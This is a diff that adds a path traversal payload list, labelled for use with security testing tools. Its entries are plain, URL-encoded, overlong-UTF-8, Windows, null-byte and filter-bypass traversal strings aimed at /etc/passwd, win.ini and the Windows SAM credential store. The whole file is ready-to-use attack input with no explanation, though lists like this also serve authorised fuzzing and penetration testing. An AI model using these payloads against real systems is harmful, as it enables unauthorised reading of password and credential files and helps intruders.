@@ -1,0 +1,30 @@
+# Path Traversal Payloads
+# Use with security testing tools
+
+# Basic Linux
+../../../etc/passwd
+....//....//....//etc/passwd
+..%252f..%252f..%252fetc/passwd
+%2e%2e/%2e%2e/%2e%2e/etc/passwd
+
+# Encoded
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+..%c0%af..%c0%af..%c0%afetc/passwd
+..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd
+%252e%252e%252f%252e%252e%252fetc%252fpasswd
+
+# Windows
+..\\..\\..\\windows\\win.ini
+..\\..\\..\\windows\\system32\\config\\sam
+..%5c..%5c..%5cwindows%5cwin.ini
+..%255c..%255c..%255cwindows%255cwin.ini
+
+# Null byte (legacy)
+../../../etc/passwd%00
+../../../etc/passwd%00.jpg
+../../../etc/passwd%00.png
+
+# Filter bypass
+....//....//....//etc/passwd
+..../..../..../etc/passwd
+/var/www/images/../../../etc/passwd
